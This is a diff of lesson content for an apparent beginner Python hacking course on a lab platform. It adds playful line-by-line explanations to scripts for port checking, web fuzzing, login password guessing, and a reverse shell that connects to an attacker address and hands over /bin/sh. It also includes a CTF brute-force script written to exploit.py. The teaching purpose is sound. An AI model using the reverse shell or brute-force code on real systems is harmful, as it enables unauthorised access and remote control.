@@ -9,7 +9,6 @@ Python is super friendly, but it has a very short memory. To help Python remembe
 
 Here is how we tell Python to remember things:
 
-# Labeled boxes
 ip_address = "192.168.1.50"   # A box holding a string of text
 target_port = 80             # A box holding a number
 is_active = True             # A box holding a yes/no switch (boolean)
@@ -17,6 +16,13 @@ is_active = True             # A box holding a yes/no switch (boolean)
 If we want the robot to shout out what is inside a box, we tell it to 'print()':
 print("[+] Target IP: " + ip_address)
 print(f"[+] Scanning port: {target_port}")
+
+#### Line-by-Line Code Explanation:
+*   ip_address = "192.168.1.50": We grab a clean box, write the label ip_address on the outside, and put a paper strip with the text "192.168.1.50" inside it.
+*   target_port = 80: We grab another box, write target_port on it, and drop the number block 80 inside.
+*   is_active = True: We grab a third box, label it is_active, and flip the switch inside to True (which means "Yes!").
+*   print("[+] Target IP: " + ip_address): We tell our robot helper to shout out the message. The + sign is like gluing our text together with whatever is inside the ip_address box.
+*   print(f"[+] Scanning port: {target_port}"): The f prefix is like a magic window. It tells the robot to look inside the curly braces {}, find the box named target_port, read the number inside it, and shout it out as part of the sentence.
 
 Types of Toys:
 Python is smart enough to know what kind of toy is in each box. Text toys are called strings ('str'), and number toys are called integers ('int').
@@ -47,11 +53,9 @@ import socket
 target_host = "host.docker.internal"
 target_port = 80
 
-# 1. Grab our magical cup-and-string telephone
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.settimeout(2.0) # If they don't answer in 2 seconds, walk away!
+s.settimeout(2.0)
 
-# 2. Try to connect and knock on the door
 result = s.connect_ex((target_host, target_port))
 
 if result == 0:
@@ -60,6 +64,17 @@ else:
     print("[-] Knock knock! No one answered. The door is closed.")
 
 s.close()
+
+#### Line-by-Line Code Explanation:
+*   import socket: This opens our toy drawer and pulls out the "magic network walkie-talkies" box.
+*   target_host = "host.docker.internal": This sets a box with the street address of the toy castle we want to call.
+*   target_port = 80: This sets a box with the specific door number (door 80) we want to knock on.
+*   s = socket.socket(...): We stretch out our cup-and-string telephone line to get ready to call.
+*   s.settimeout(2.0): We set a timer. If we call them and they don't pick up in 2 seconds, we hang up so we don't wait forever.
+*   result = s.connect_ex(...): We send our helper to knock on the door. connect_ex is a friendly knock. If the door opens, it hands our helper a green block (the number 0). If the door is locked, it hands a red block.
+*   if result == 0:: We check if our helper brought back the green block (number 0).
+*   print("[+] Knock knock! The door is OPEN!") / else: ...: If it's a green block, we shout that the door is open! Otherwise, we tell everyone it is closed.
+*   s.close(): We roll up our cup-and-string telephone and put it away in the toy drawer.
 
 Why connect_ex?
 If we use standard connect() and a door is locked, our robot trips and falls down (raising an error!). But connect_ex() is polite: it just returns a secret code number. If it returns 0, it means 'Open Sesame!' — the port is open and we can connect!
@@ -74,7 +89,7 @@ TASK: Learn how sockets check for open ports and answer the questions.`,
   {
     title: "3. HTTP Requests & Web Fuzzing",
     points: 40,
-    content: `<div class="htb-diagram-container"><img src="../../../assets/python_http_diagram.png" alt="HTTP Requests & Web Fuzzing" class="htb-diagram"></div>ORDERING FOOD FROM THE SECRET MENU: WEB FUZZING
+    content: `<div class="htb-diagram-container"><img src="../../../assets/python_http_diagram.png" alt="HTTP Requests & Web Fuzzing" class="htb-diagram"></div>ORDERING FOOD FROM THE RESTAURANT: WEB FUZZING
 
 Imagine visiting a website is like going to a restaurant and ordering food. 🍔
 When you want to see a web page, you send a GET request, which is like asking the waiter: "Can I please see the menu?"
@@ -90,8 +105,15 @@ import requests
 url = "http://host.docker.internal:5000/"
 response = requests.get(url)
 
-print(response.status_code) # Prints 200 or 404
-print(response.text)        # Prints the HTML source code
+print(response.status_code)
+print(response.text)
+
+#### Line-by-Line Code Explanation:
+*   import requests: We go to the closet and fetch our fast-running waiter helper named "Requests".
+*   url = "http://host.docker.internal:5000/": We set the address of the kitchen table we want to order from.
+*   response = requests.get(url): We tell our waiter to run to the kitchen table (GET request) and bring back everything they find, saving it all inside the response box.
+*   print(response.status_code): We check what code the kitchen gave us. If it says 200, they gave us the food! If it says 404, they got lost or the food doesn't exist.
+*   print(response.text): We open the food container and print out the actual recipe list (HTML source code) of the webpage.
 
 What is Web Fuzzing?
 Imagine a restaurant has a secret menu that they only show to VIPs, but they won't tell you the names of the dishes! To find them, you stand at the counter and rapidly guess words: "Is there a secret admin? Is there a secret login? Is there a secret robots.txt?"
@@ -119,7 +141,6 @@ Here is how we send a POST request with our guess:
 import requests
 url = "http://host.docker.internal:5000/admin-login"
 
-# The key-value form we are handing to the guard
 payload = {
     "username": "admin",
     "password": "wrongpassword"
@@ -127,11 +148,18 @@ payload = {
 
 response = requests.post(url, data=payload)
 
-# If we see "Welcome" in the response, we are in!
-if "Welcome Administrator" in response.text:
+if "Welcome" in response.text:
     print("[+] Access Granted!")
 else:
     print("[-] Access Denied.")
+
+#### Line-by-Line Code Explanation:
+*   import requests: We call our waiter runner helper.
+*   url = "http://...": We set the address of the castle gate control panel.
+*   payload = { "username": "admin", "password": "wrongpassword" }: We write our name (admin) and our guess password on a post-it note card. This key-value list is called a dictionary.
+*   response = requests.post(url, data=payload): We hand the post-it note card to our waiter, who runs to the gate and slides it into the slot (POST request), returning with a reply sheet.
+*   if "Welcome" in response.text:: We look at the reply sheet. If it has the word "Welcome" written on it, we did it!
+*   print("[+] Access Granted!") / else: ...: We celebrate if we got in, or write down a sad face if the guard rejected our guess password.
 
 By looping through a list of passwords (a wordlist), we can test them in the blink of an eye!
 
@@ -162,15 +190,23 @@ attacker_ip = "10.10.10.2"
 attacker_port = 4444
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect((attacker_ip, attacker_port)) # Connect back to attacker!
+s.connect((attacker_ip, attacker_port))
 
-# Redirect computer's ears (stdin) and mouth (stdout/stderr) to the socket rope!
-os.dup2(s.fileno(), 0) # Ears
-os.dup2(s.fileno(), 1) # Mouth
-os.dup2(s.fileno(), 2) # Screaming mouth (errors)
+os.dup2(s.fileno(), 0)
+os.dup2(s.fileno(), 1)
+os.dup2(s.fileno(), 2)
 
-# Launch the interactive terminal
 subprocess.call(["/bin/sh", "-i"])
+
+#### Line-by-Line Code Explanation:
+*   import socket, subprocess, os: We open our trunk and grab three tool kits: a telephone kit (socket), a toy command room kit (subprocess), and a window-taping kit (os).
+*   attacker_ip = "10.10.10.2" and attacker_port = 4444: We write down the attacker's yard address and walkie-talkie channel so the script knows where to throw the rope.
+*   s = socket.socket(...): We tie a heavy knot on our rope (TCP network socket client).
+*   s.connect((attacker_ip, attacker_port)): We throw the rope out of the window down to the attacker's yard!
+*   os.dup2(s.fileno(), 0): We tape the computer's ears (Standard Input) to the rope. Now, anything the attacker whispers into the rope is heard by the computer.
+*   os.dup2(s.fileno(), 1): We tape the computer's mouth (Standard Output) to the rope. Now, anything the computer says goes straight down the rope to the attacker.
+*   os.dup2(s.fileno(), 2): We tape the computer's crying mouth (Standard Error) to the rope, so if it makes a mistake, the attacker hears that too.
+*   subprocess.call(["/bin/sh", "-i"]): We open the control console inside the computer. Since ears and mouth are taped to our rope, the attacker can now run anything they want inside the computer!
 
 By cloning the standard descriptors (0 for ears/stdin, 1 for mouth/stdout), the terminal now listens to commands coming over the socket network connection!
 
@@ -197,23 +233,50 @@ Step-by-Step Instructions:
 3. Inside your Kali machine, look for the secret door. Check what is disallowed by visiting the robots.txt file:
    curl http://host.docker.internal:PORT/robots.txt
 4. This reveals the secret door path (hint: /admin-login).
-5. Now, write a Python brute-forcing script in Kali to try passwords for the 'admin' account:
-   ['admin', '123456', 'password', 'pypower', 'letmein']
-   
-   Example python script template to run inside Kali:
-   -------------------------------------------------
-   import requests
-   url = "http://host.docker.internal:PORT/admin-login"
-   passwords = ['admin', '123456', 'password', 'pypower', 'letmein']
-   for p in passwords:
-       r = requests.post(url, data={'username': 'admin', 'password': p})
-       if "Flag" in r.text or r.status_code == 200:
-           print(f"Success! Password is: {p}")
-           print(r.text)
-           break
-   -------------------------------------------------
-   
-6. Execute your script, crack the portal, and retrieve the flag (format: CTF{...}).
+5. Open a terminal editor to create your Python script file, or use a redirect to write it directly:
+
+   Method A: Using Nano
+   - Type: nano exploit.py
+   - Paste the code template below, then save (Ctrl+O then Enter) and exit (Ctrl+X).
+
+   Method B: Write directly with EOF redirect (recommended)
+   Copy and paste this entire block directly into your Kali terminal command line:
+
+cat << 'EOF' > exploit.py
+import requests
+url = "http://host.docker.internal:PORT/admin-login"
+passwords = ['admin', '123456', 'password', 'pypower', 'letmein']
+for p in passwords:
+    r = requests.post(url, data={'username': 'admin', 'password': p})
+    if "Flag" in r.text or r.status_code == 200:
+        print(f"Success! Password is: {p}")
+        print(r.text)
+        break
+EOF
+
+   *** IMPORTANT: YOU MUST REPLACE PORT ***
+   After creating the file, open it and replace the word PORT
+   with the actual port number shown on the Target Server panel above.
+   For example, if the panel says:
+       "Target running! Access inside Kali at http://host.docker.internal:32771"
+   Then run this command to fix the port:
+       sed -i 's/PORT/32771/' exploit.py
+   (Use whatever number YOUR panel shows, not 32771.)
+
+6. Run your completed script using Python:
+   python3 exploit.py
+
+#### Line-by-Line Code Explanation:
+*   import requests: Call our fast-running waiter helper.
+*   url = "http://...": Write down the address of the locked chest control panel.
+*   passwords = [...]: Fill a bag with key guesses we want to try: admin, 123456, password, etc.
+*   for p in passwords:: Grab the bag of keys and try them one by one. The current key guess is named p.
+*   r = requests.post(...): Put the key guess p in the keyhole and slide it in (POST request), getting back the chest's reply r.
+*   if "Flag" in r.text or r.status_code == 200:: Check if the lock clicked open and revealed the secret paper inside, or if the light turned green (status code 200).
+*   print(f"Success! Password is: {p}") and print(r.text): Shout out: "Aha! The key is pypower!" and print the secret code flag written inside the chest.
+*   break: Stop trying keys from the bag because the chest is already open!
+
+7. Retrieve the flag (format: CTF{...}).
 
 TASK: Solve the challenge, find the path, password, and flag!`,
     questions: [
